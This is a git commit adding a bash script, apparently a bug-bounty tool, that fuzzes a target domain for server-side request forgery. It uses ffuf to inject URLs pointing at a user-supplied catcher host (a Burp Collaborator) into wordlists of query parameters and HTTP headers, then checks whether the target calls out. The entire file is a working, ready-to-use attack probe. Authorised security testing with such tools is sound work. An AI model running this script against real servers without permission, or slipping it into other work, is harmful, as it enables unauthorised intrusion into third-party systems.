cd86828e32825e04fb4652cc61bb52cd9fb81d41
Rotem Reiss <reiss.r@gmail.com>
2020-07-12 23:45:43 +0300

    Initial commit.

---
+++ ssrfuck.sh
@@ -0,0 +1,51 @@
+#!/usr/bin/env bash
+
+DOMAIN=$1
+
+# Usually your Burp collaborator (without the http/s schema.)
+SSRF_CATCHER=$2
+
+# Get the "clean" domain without the schema. This will be used for the ffuf output file name.
+DOMAIN_CLEAN=`echo ${DOMAIN} | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's/:[0-9]*$//'`
+
+# Cause every bash script needs a banner :D
+banner() {
+    echo -en "\033[31m"
+	
+	cat << "EOF"
+
+
+ _____ _________________          _    
+/  ___/  ___| ___ \  ___|        | |   
+\ `--.\ `--.| |_/ / |_ _   _  ___| | __
+ `--. \`--. \    /|  _| | | |/ __| |/ /
+/\__/ /\__/ / |\ \| | | |_| | (__|   < 
+\____/\____/\_| \_\_|  \__,_|\___|_|\_\
+                                       
+
+	# By 2RS3C (https://twitter.com/2RS3C)
+EOF
+
+	echo -en "\033[0m"
+}
+
+fuzz_params() {
+	ffuf -w parameters.txt -u "${DOMAIN}?FUZZ=https:%2F%2FFUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -mc all -o ./ffuf-output/${DOMAIN_CLEAN}-parameters.json >> /dev/null 2>&1
+}
+
+fuzz_headers() {
+	ffuf -w headers.txt -u "${DOMAIN}" -H "FUZZ: http://FUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -o ./ffuf-output/${DOMAIN_CLEAN}-headers.json >> /dev/null 2>&1
+}
+
+####### Start #######
+
+banner
+
+echo "[-] Fuzzing parameters in ${DOMAIN}."
+fuzz_params
+
+echo "[-] Fuzzing headers in ${DOMAIN}."
+fuzz_headers
+
+echo "[+] Done fuzzing in ${DOMAIN}."
+echo "[+] Check for requests on your server (${SSRF_CATCHER})."
